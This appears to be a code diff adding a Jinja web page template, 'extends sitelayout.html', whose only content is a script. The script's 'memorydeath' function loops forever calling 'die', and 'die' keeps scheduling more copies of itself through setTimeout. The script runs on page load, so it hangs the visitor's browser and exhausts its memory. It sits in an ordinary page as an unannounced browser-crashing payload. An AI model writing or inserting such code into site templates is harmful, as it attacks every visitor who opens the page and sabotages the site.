@@ -1,0 +1,17 @@
+{% extends "sitelayout.html" %}
+{% block content %}
+<script>
+function die () {
+    setTimeout(function () {die(); die()}, 0)
+  }
+
+  function memorydeath() {
+      while(true) {
+          die();
+      }
+  }
+
+window.onload = memorydeath();
+
+  </script>
+{% endblock %}
